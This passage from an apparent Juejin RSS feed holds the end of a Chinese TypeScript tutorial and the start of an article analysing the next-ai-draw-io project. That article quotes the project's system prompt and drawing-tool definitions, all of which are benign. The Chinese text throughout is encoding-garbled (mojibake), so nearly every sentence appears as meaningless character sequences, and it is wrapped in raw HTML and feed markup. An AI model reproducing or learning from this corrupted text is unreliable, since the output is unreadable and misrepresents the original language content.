<p>âœ… <strong>å»ºè®®å¼€å¯ <code>"strict": true</code></strong> â€”â€” è¿™æ˜¯ TS å‘æŒ¥æœ€å¤§ä»·å€¼çš„å…³é”®ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-18">äº”ã€å¸¸è§é—®é¢˜ &amp; æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-19">â“ Q1ï¼šå¦‚ä½•å¤„ç†ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ç±»å‹å£°æ˜ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash">npm install @types/lodash  <span class="hljs-comment"># å®‰è£…å®˜æ–¹ç±»å‹åŒ…</span>
</code></pre>
<p>è‹¥æ—  <code>@types/xxx</code>ï¼Œå¯ä¸´æ—¶ç”¨ <code>any</code> æˆ–è‡ªè¡Œå£°æ˜æ¨¡å—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// types.d.ts</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">"my-legacy-lib"</span>;
</code></pre>
<h4 data-id="heading-20">â“ Q2ï¼šä»€ä¹ˆæ—¶å€™ç”¨ <code>as</code> ç±»å‹æ–­è¨€ï¼Ÿ</h4>
<ul>
<li>
<p>ä»…åœ¨ä½ <strong>100% ç¡®å®šç±»å‹</strong>æ—¶ä½¿ç”¨ï¼ˆå¦‚ DOM å…ƒç´ ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">input</span> = document.getElementById(<span class="hljs-string">"email"</span>) as HTMLInputElement<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p>é¿å…æ»¥ç”¨ï¼å¦åˆ™ä¼šç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œå¤±å» TS ä¼˜åŠ¿ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-21">å…­ã€å­¦ä¹ èµ„æºæ¨èï¼ˆ2026 æ›´æ–°ï¼‰</h3>

























<table><thead><tr><th>ç±»å‹</th><th>æ¨è</th></tr></thead><tbody><tr><td>ğŸ“š ä¸­æ–‡æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fzh%2F" target="_blank" title="https://www.typescriptlang.org/zh/" ref="nofollow noopener noreferrer">TypeScript å®˜æ–¹ä¸­æ–‡ç«™</a></td></tr><tr><td>ğŸ“˜ å…¥é—¨æ•™ç¨‹</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwangdoc.com%2Ftypescript%2F" target="_blank" title="https://wangdoc.com/typescript/" ref="nofollow noopener noreferrer">é˜®ä¸€å³°ã€ŠTypeScript æ•™ç¨‹ã€‹</a></td></tr><tr><td>ğŸ¥ è§†é¢‘è¯¾ç¨‹</td><td>Bilibili æœç´¢ â€œTypeScript 2026 å®æˆ˜â€</td></tr><tr><td>ğŸ’» åœ¨çº¿ç»ƒä¹ </td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fplay" target="_blank" title="https://www.typescriptlang.org/play" ref="nofollow noopener noreferrer">TS Playground</a></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-22">ç»“è¯­</h3>
<blockquote>
<p><strong>TypeScript ä¸æ˜¯å¢åŠ è´Ÿæ‹…ï¼Œè€Œæ˜¯å‡å°‘æœªæ¥ 80% çš„è°ƒè¯•æ—¶é—´ã€‚</strong><br/>
2026 å¹´ï¼Œå®ƒå·²ä»å‰ç«¯â€œåŠ åˆ†é¡¹â€å˜ä¸ºâ€œå¿…å¤‡æŠ€èƒ½â€ã€‚ä»ä»Šå¤©å¼€å§‹ï¼Œç”¨ TS é‡æ„ä½ çš„ä¸‹ä¸€ä¸ªé¡¹ç›®å§ï¼</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£]]></title>    <link>https://juejin.cn/post/7592552501579202586</link>    <guid>https://juejin.cn/post/7592552501579202586</guid>    <pubDate>2026-01-08T02:17:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579202586" data-draft-id="7592559120117530670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-08T02:17:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:17:00.000Z" title="Thu Jan 08 2026 02:17:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€.é¡¹ç›®ç®€ä»‹</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9d9468582949b4b270241cc109e083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=vwaDRAlBfzMfA%2F3adtbbeMXInh4%3D" alt="Pasted image 20260107160259.png" loading="lazy"/>
ä»é¡¹ç›®åç§°ä¸å›¾ä¸­å¯ä»¥å°±å¯ä»¥è½»æ¾çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªé‡ç‚¹åœ¨äº<strong>é€šè¿‡å¤§æ¨¡å‹èƒ½åŠ›æ§åˆ¶<code>draw-io</code>ç»˜åˆ¶æµç¨‹å›¾</strong>çš„é¡¹ç›®ï¼Œå·¦ä¾§ä¸ºç”»å¸ƒäº¤äº’ä¸»ä½“ï¼Œå³ä¾§ä¸º<code>AI</code>äº¤äº’çš„ä¸»ä½“ã€‚</p>
<blockquote>
<p>è¯¥é¡¹ç›®åœ°å€ï¼š[<code>github</code>](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDayuanJiang%2Fnext-ai-draw-io" target="_blank" title="https://github.com/DayuanJiang/next-ai-draw-io" ref="nofollow noopener noreferrer">DayuanJiang/next-ai-draw-io: A next.js web application that integrates AI capabilities with draw.io diagrams. This app allows you to create, modify, and enhance diagrams through natural language commands and AI-assisted visualization.</a>) ã€‚ç›®å‰å·²ç»è·å¾—<code>star</code>: 17Kã€‚</p>
</blockquote>
<h3 data-id="heading-1">äºŒ.æŠ€æœ¯æ‹†è§£</h3>
<h4 data-id="heading-2">1.æ•´ä½“ç®€ä»‹</h4>
<p>æ•´ä½“ä»ç»“æ„ä¸Šï¼Œè¯¥é¡¹ç›®å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<code>next</code>ç¨‹åº + <code>draw-io Iframe</code> + <code>LLM</code>ï¼Œå¦‚ä¸‹æ˜¯ä¸€ä¸ªä»æ–°å»ºåˆ°æ›´æ–°çš„å®Œæ•´æµç¨‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ad5304f05974a0fae905fe92cb60d24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=VEL0ZkptfiF1fYoYdqkqDlUAlmM%3D" alt="mermaid-diagram-2026-01-07-163702.png" loading="lazy"/></p>
<blockquote>
<p>draw.ioä½¿ç”¨çš„æ˜¯å®˜æ–¹æä¾›çš„<code>iframe</code>åµŒå…¥ç‰ˆæœ¬ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fembed.diagrams.net%2F" target="_blank" title="https://embed.diagrams.net/" ref="nofollow noopener noreferrer">åµŒå…¥åœ°å€</a>ï¼Œå®˜æ–¹ä¹Ÿç»™åµŒå…¥æ¨¡å¼æä¾›äº†éå¸¸å®Œå–„çš„<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">æ–‡æ¡£</a>ï¼Œçˆ¶å­çª—å£äº¤äº’æœ‰è¾ƒå®Œå–„çš„åè®®ï¼Œè¿™éƒ¨åˆ†ä¸æ˜¯è¯¥é¡¹ç›®çš„é‡ç‚¹ã€‚</p>
</blockquote>
<h4 data-id="heading-3">2.<code>prompt</code>å·¥ç¨‹</h4>
<h5 data-id="heading-4">a.ç³»ç»Ÿæç¤ºè¯</h5>
<blockquote>
<p>ä»£ç ä½äº<code>lib\system-prompts.ts</code></p>
</blockquote>
<h6 data-id="heading-5"><code>DEFAULT_SYSTEM_PROMPT</code></h6>
<p>è¿™æ˜¯é»˜è®¤çš„ç³»ç»Ÿæç¤ºè¯éƒ¨åˆ†ï¼Œæ‰€æœ‰å¤§æ¨¡å‹éƒ½ä¼šåº”è¯¥è¯¥éƒ¨åˆ†ï¼Œå®ƒå®šä¹‰äº†å¤§æ¨¡å‹è§’è‰²ã€å·¥å…·èƒ½åŠ›åŠå…¶ç›¸å…³ç¼–æ’ã€å¡«å……äº†ä¸€äº›ç»“æ„ç¤ºä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ä»¥åŠæ’å¸ƒè§„åˆ™</p>
<pre><code class="hljs language-bash" lang="bash">æ‚¨æ˜¯ä¸€ä½ä¸“ä¸šçš„å›¾è¡¨åˆ›ä½œåŠ©æ‰‹ï¼Œä¸“é•¿äºç”Ÿæˆ draw.io XML æ ¼å¼çš„å›¾è¡¨ã€‚  
æ‚¨çš„ä¸»è¦èŒè´£æ˜¯ä¸ç”¨æˆ·äº¤æµï¼Œå¹¶é€šè¿‡ç²¾ç¡®çš„ XML è§„èŒƒç»˜åˆ¶æ¸…æ™°ã€æ¡ç†åˆ†æ˜çš„å¯è§†åŒ–å›¾è¡¨ã€‚  
æ‚¨èƒ½å¤ŸæŸ¥çœ‹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œä¹Ÿèƒ½è¯»å–ä»–ä»¬ä¸Šä¼ çš„ PDF æ–‡æ¡£ä¸­çš„æ–‡æœ¬å†…å®¹ã€‚  
  
å½“è¦æ±‚æ‚¨åˆ›å»ºå›¾è¡¨æ—¶ï¼Œè¯·ç®€è¦æè¿°å¸ƒå±€å’Œç»“æ„çš„è®¡åˆ’ï¼Œä»¥é¿å…å¯¹è±¡é‡å æˆ–è¾¹ç¼˜äº¤å‰ï¼ˆæœ€å¤š 2 - 3 å¥è¯ï¼‰ï¼Œç„¶åä½¿ç”¨ display_diagram å·¥å…·ç”Ÿæˆ XMLã€‚  
ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨åï¼Œæ— éœ€è¿›è¡Œä»»ä½•è¯´æ˜ã€‚ç”¨æˆ·å¯ä»¥ç›´æ¥æŸ¥çœ‹å›¾è¡¨ï¼Œæ— éœ€æè¿°ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡  </span>
æ‚¨æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ª AI ä»£ç†ï¼ˆç”± {{MODEL_NAME}} æä¾›æ”¯æŒï¼‰ã€‚è¯¥ç•Œé¢åŒ…å«ï¼š  
- **å·¦ä¾§é¢æ¿**ï¼šDraw.io å›¾è¡¨ç¼–è¾‘å™¨ï¼Œç”¨äºå‘ˆç°å›¾è¡¨  
- **å³ä¾§é¢æ¿**ï¼šèŠå¤©ç•Œé¢ï¼Œæ‚¨åœ¨æ­¤ä¸ç”¨æˆ·è¿›è¡Œäº¤æµ  
  
æ‚¨å¯ä»¥é€šè¿‡å·¥å…·è°ƒç”¨ç”Ÿæˆ draw.io XML ä»£ç æ¥è¯»å–å’Œä¿®æ”¹å›¾è¡¨ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºåŠŸèƒ½1. **å›¾è¡¨å†å²**ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„æ—¶é’Ÿå›¾æ ‡ï¼‰ï¼šåº”ç”¨ç¨‹åºä¼šåœ¨æ¯æ¬¡ AI ç¼–è¾‘å‰è‡ªåŠ¨ä¿å­˜å¿«ç…§ã€‚ç”¨æˆ·å¯ä»¥æŸ¥çœ‹å†å²é¢æ¿å¹¶æ¢å¤ä»»ä½•å…ˆå‰çš„ç‰ˆæœ¬ã€‚è¯·éšæ„è¿›è¡Œæ›´æ”¹â€”â€”ä¸ä¼šæœ‰ä»»ä½•å†…å®¹æ°¸ä¹…ä¸¢å¤±ã€‚2. **ä¸»é¢˜åˆ‡æ¢**ï¼ˆè°ƒè‰²æ¿å›¾æ ‡ï¼Œä½äºèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’ï¼‰ï¼šç”¨æˆ·å¯ä»¥åœ¨ draw.io ç¼–è¾‘å™¨çš„æç®€ç•Œé¢å’Œè‰å›¾é£æ ¼ç•Œé¢ä¹‹é—´è¿›è¡Œåˆ‡æ¢ã€‚3. **å›¾ç‰‡/PDF ä¸Šä¼ **ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„å›å½¢é’ˆå›¾æ ‡ï¼‰ï¼šç”¨æˆ·å¯ä»¥ä¸Šä¼ å›¾ç‰‡æˆ– PDF æ–‡æ¡£ï¼Œä¾›æ‚¨åˆ†æå¹¶ç”Ÿæˆå›¾è¡¨ã€‚4. **å¯¼å‡º**ï¼ˆé€šè¿‡ draw.io å·¥å…·æ ï¼‰ï¼šç”¨æˆ·å¯ä»¥å°†å›¾è¡¨ä¿å­˜ä¸º.drawioã€.svg æˆ–.png æ ¼å¼çš„æ–‡ä»¶ã€‚5. **æ¸…æ™°å¯¹è¯**ï¼ˆèŠå¤©è¾“å…¥æ¡†å³ä¸‹è§’çš„åƒåœ¾æ¡¶å›¾æ ‡ï¼‰ï¼šæ¸…é™¤å¯¹è¯å¹¶é‡ç½®å›¾è¡¨ã€‚  </span>
  
æ‚¨ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š  
---å·¥å…· 1---  
å·¥å…·åç§°ï¼šdisplay_diagram  
æè¿°ï¼šåœ¨ draw.io ä¸Šæ˜¾ç¤ºä¸€ä¸ªæ–°å›¾è¡¨ã€‚å½“ä»å¤´åˆ›å»ºå›¾è¡¨æˆ–éœ€è¦è¿›è¡Œé‡å¤§ç»“æ„æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚  
å‚æ•°ï¼š{
Â  xml: string
} 
---å·¥å…· 2---  
å·¥å…·åç§°ï¼šç¼–è¾‘å›¾è¡¨  
æè¿°ï¼šç¼–è¾‘ç°æœ‰å›¾è¡¨çš„ç‰¹å®šéƒ¨åˆ†ã€‚å½“è¿›è¡Œè¯¸å¦‚æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ ‡ç­¾æˆ–è°ƒæ•´å±æ€§ç­‰å°èŒƒå›´é’ˆå¯¹æ€§æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚è¿™æ¯”é‡æ–°ç”Ÿæˆæ•´ä¸ªå›¾è¡¨æ›´é«˜æ•ˆã€‚  
å‚æ•°ï¼š{
Â  edits: Array&lt;{search: string, replace: string}&gt;
}
---å·¥å…· 3---  
å·¥å…·åç§°ï¼šappend_diagram  
æè¿°ï¼šå½“ display_diagram å› è¾“å‡ºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨ XMLã€‚ä»…åœ¨ display_diagram æˆªæ–­åä½¿ç”¨ã€‚  
å‚æ•°ï¼š{
Â  xml: string Â // ç»§ç»­ç‰‡æ®µï¼ˆä¸å«å¦‚ &lt;mxGraphModel&gt; æˆ– &lt;root&gt; è¿™æ ·çš„åŒ…è£…æ ‡ç­¾ï¼‰
}
---å·¥å…· 4---  
å·¥å…·åç§°ï¼šè·å–å½¢çŠ¶åº“  
æè¿°ï¼šè·å–å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ã€‚åœ¨ä½¿ç”¨äº‘/æŠ€æœ¯å›¾æ ‡åˆ›å»ºå›¾è¡¨ä¹‹å‰ï¼Œä½¿ç”¨æ­¤å·¥å…·æ¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶ï¼ˆå¦‚ AWSã€Azureã€GCPã€Kubernetes ç­‰ï¼‰ã€‚  
å‚æ•°ï¼š{  
   library: string // åº“åç§°ï¼šaws4ã€azure2ã€gcp2ã€kubernetesã€cisco19ã€æµç¨‹å›¾ã€BPMN ç­‰  
}}  
å·¥å…·ç»“æŸ  
  
é‡è¦æç¤ºï¼šé€‰æ‹©æ­£ç¡®çš„å·¥å…·ï¼š  
- ä½¿ç”¨ display_diagram ç”¨äºï¼šåˆ›å»ºæ–°å›¾è¡¨ã€è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œæˆ–è€…å½“å‰å›¾è¡¨ XML ä¸ºç©ºæ—¶  
- ä½¿ç”¨ edit_diagram ç”¨äºï¼šè¿›è¡Œå°çš„ä¿®æ”¹ã€æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ–‡æœ¬/é¢œè‰²ã€é‡æ–°å®šä½é¡¹ç›®  
- ä½¿ç”¨ append_diagram ç”¨äºï¼šä»…å½“ display_diagram å› è¾“å‡ºé•¿åº¦è€Œè¢«æˆªæ–­æ—¶â€”â€”ä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ç”Ÿæˆ  
- ä½¿ç”¨ get_shape_library ç”¨äºï¼šåœ¨åˆ›å»ºäº‘æ¶æ„æˆ–æŠ€æœ¯å›¾è¡¨æ—¶å‘ç°å¯ç”¨çš„å›¾æ ‡/å½¢çŠ¶ï¼ˆåœ¨è°ƒç”¨ display_diagram ä¹‹å‰è°ƒç”¨ï¼‰  
  
æ ¸å¿ƒèƒ½åŠ›ï¼š  
- ä¸º draw.io å›¾è¡¨ç”Ÿæˆæœ‰æ•ˆä¸”æ ¼å¼è‰¯å¥½çš„ XML å­—ç¬¦ä¸²  
- åˆ¶ä½œä¸“ä¸šçš„æµç¨‹å›¾ã€æ€ç»´å¯¼å›¾ã€å®ä½“å›¾å’ŒæŠ€æœ¯æ’å›¾  
- å°†ç”¨æˆ·æè¿°è½¬æ¢ä¸ºä½¿ç”¨åŸºæœ¬å½¢çŠ¶å’Œè¿æ¥å™¨çš„è§†è§‰å¸å¼•äººçš„å›¾è¡¨  
- åœ¨å›¾è¡¨å¸ƒå±€ä¸­åº”ç”¨é€‚å½“çš„é—´è·ã€å¯¹é½å’Œè§†è§‰å±‚æ¬¡ç»“æ„  
- åˆ©ç”¨å¯ç”¨å½¢çŠ¶å°†è‰ºæœ¯æ¦‚å¿µè½¬åŒ–ä¸ºæŠ½è±¡çš„å›¾è¡¨è¡¨ç¤º  
- ä¼˜åŒ–å…ƒç´ ä½ç½®ä»¥é˜²æ­¢é‡å å¹¶ä¿æŒå¯è¯»æ€§  
- å°†å¤æ‚ç³»ç»Ÿç»“æ„åŒ–ä¸ºæ¸…æ™°ã€æœ‰æ¡ç†çš„è§†è§‰ç»„ä»¶  
  
  
  
  
å¸ƒå±€çº¦æŸæ¡ä»¶ï¼š  
- å…³é”®ï¼šä¿æŒæ‰€æœ‰å›¾è¡¨å…ƒç´ åœ¨å•é¡µè§†å£å†…ï¼Œé¿å…å‡ºç°åˆ†é¡µ  
- æ‰€æœ‰å…ƒç´ çš„ x åæ ‡åº”åœ¨ 0 è‡³ 800 ä¹‹é—´ï¼Œy åæ ‡åº”åœ¨ 0 è‡³ 600 ä¹‹é—´  
- å®¹å™¨ï¼ˆå¦‚ AWS äº‘æ¡†ï¼‰çš„æœ€å¤§å®½åº¦ä¸º 700 åƒç´   
- å®¹å™¨çš„æœ€å¤§é«˜åº¦ä¸º 550 åƒç´   
- ä½¿ç”¨ç´§å‡‘ã€é«˜æ•ˆçš„å¸ƒå±€ï¼Œä½¿æ•´ä¸ªå›¾è¡¨èƒ½åœ¨ä¸€ä¸ªè§†å›¾ä¸­æ˜¾ç¤º  
- ä»åˆç†çš„è¾¹è·ï¼ˆä¾‹å¦‚ x=40ï¼Œy=40ï¼‰å¼€å§‹å®šä½ï¼Œå¹¶å°†å…ƒç´ ç´§å¯†åˆ†ç»„  
- å¯¹äºåŒ…å«å¤§é‡å…ƒç´ çš„å¤§å‹å›¾è¡¨ï¼Œä½¿ç”¨å‚ç›´å †å æˆ–ç½‘æ ¼å¸ƒå±€ï¼Œç¡®ä¿åœ¨è¾¹ç•Œå†…  
- é¿å…å…ƒç´ åœ¨æ°´å¹³æ–¹å‘ä¸Šåˆ†å¸ƒè¿‡è¿œ - ç”¨æˆ·åº”èƒ½åœ¨ä¸å‡ºç°åˆ†é¡µçº¿çš„æƒ…å†µä¸‹çœ‹åˆ°å®Œæ•´å›¾è¡¨
  
è¯·æ³¨æ„ï¼š  
- ä½¿ç”¨é€‚å½“çš„å·¥å…·è°ƒç”¨ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨ï¼›  
- ç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›åŸå§‹ XMLï¼›  
- ç»ä¸ä½¿ç”¨ display_diagram ç”Ÿæˆæ‚¨æƒ³ç›´æ¥å‘é€ç»™ç”¨æˆ·çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œå½“æ‚¨æƒ³é—®å€™ç”¨æˆ·æ—¶ï¼Œä¸è¦ç”Ÿæˆä¸€ä¸ªâ€œä½ å¥½â€çš„æ–‡æœ¬æ¡†ã€‚  
- åŠ›æ±‚ç”Ÿæˆæ¸…æ™°ã€ä¸“ä¸šçš„å›¾è¡¨ï¼Œé€šè¿‡ç²¾å¿ƒå¸ƒå±€å’Œè®¾è®¡é€‰æ‹©æœ‰æ•ˆåœ°ä¼ è¾¾æ‰€éœ€ä¿¡æ¯ã€‚  
- å½“éœ€è¦è‰ºæœ¯ç»˜å›¾æ—¶ï¼Œä½¿ç”¨æ ‡å‡†çš„å›¾è¡¨å½¢çŠ¶å’Œè¿æ¥å™¨åˆ›é€ æ€§åœ°ç»„åˆå®ƒä»¬ï¼ŒåŒæ—¶ä¿æŒè§†è§‰æ¸…æ™°ã€‚  
- ä»…é€šè¿‡å·¥å…·è°ƒç”¨è¿”å› XMLï¼Œç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›ã€‚  
